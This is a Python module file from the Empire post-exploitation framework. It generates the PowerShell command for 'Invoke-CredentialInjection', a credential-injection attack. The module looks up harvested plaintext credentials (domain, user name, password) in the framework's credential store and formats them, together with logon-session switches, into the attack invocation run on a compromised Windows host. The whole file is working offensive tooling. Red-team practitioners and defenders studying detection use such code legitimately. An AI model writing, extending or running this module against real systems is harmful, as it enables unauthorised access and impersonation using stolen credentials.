from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source
from empire.server.utils.option_util import coerce_legacy_value


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        script_end = "Invoke-CredentialInjection"

        if not params["NewWinLogon"] and not params["ExistingWinLogon"]:
            raise ModuleValidationException(
                "Either NewWinLogon or ExistingWinLogon must be specified"
            )

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            with SessionLocal() as db:
                cred = main_menu.credentialsv2.get_by_id(db, cred_id)

                if not cred:
                    raise ModuleValidationException("CredID is invalid")

                if cred.credtype != "plaintext":
                    raise ModuleValidationException(
                        "CredID must be a plaintext credential"
                    )

                if cred.domain != "":
                    params["DomainName"] = cred.domain
                if cred.username != "":
                    params["UserName"] = cred.username
                if cred.password != "":
                    params["Password"] = cred.password

        if (
            params["DomainName"] == ""
            or params["UserName"] == ""
            or params["Password"] == ""
        ):
            raise ModuleValidationException(
                "DomainName/UserName/Password or CredID required"
            )

        for option, raw_value in params.items():
            if option.lower() in ("agent", "credid"):
                continue
            # NewWinLogon / ExistingWinLogon are [Switch] params (native bools):
            # emit the bare flag only when set, never as a literal "-Option False".
            # Everything else is a value option and passes through unchanged -- a
            # literal "True"/"False" value (e.g. a password) must not be dropped.
            if isinstance(raw_value, bool):
                if raw_value:
                    script_end += " -" + str(option)
            else:
                values = coerce_legacy_value(raw_value)
                if values and values != "":
                    script_end += " -" + str(option) + " " + str(values)

        script_end += ';`n"Invoke-CredentialInjection completed."'
        return script, script_end
